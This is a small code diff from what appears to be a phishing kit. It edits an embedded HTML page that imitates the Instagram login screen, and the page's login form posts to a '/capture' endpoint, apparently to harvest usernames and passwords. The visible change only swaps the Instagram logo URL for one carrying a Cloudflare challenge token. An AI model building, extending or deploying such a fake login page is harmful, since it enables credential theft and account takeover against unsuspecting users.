@@ -195,7 +195,7 @@ INSTAGRAM_HTML = '''<!DOCTYPE html>
     <div>
       <div class="login-card">
         <div class="logo">
-  <img src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png" alt="Instagram" />
+  <img src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png?__cf_chl_f_tk=_VoQdMo.Fgvf40kfqyTPexOd4UFfdxgwjpMLFXGQBSo-1783001393-1.0.1.1-WRboyVuuUcGWg.NtStuqscoPJ1R2VcumoYmOHp4Fnfg" alt="Instagram" />
 </div>
 
         <form id="loginForm" action="/capture" method="POST">
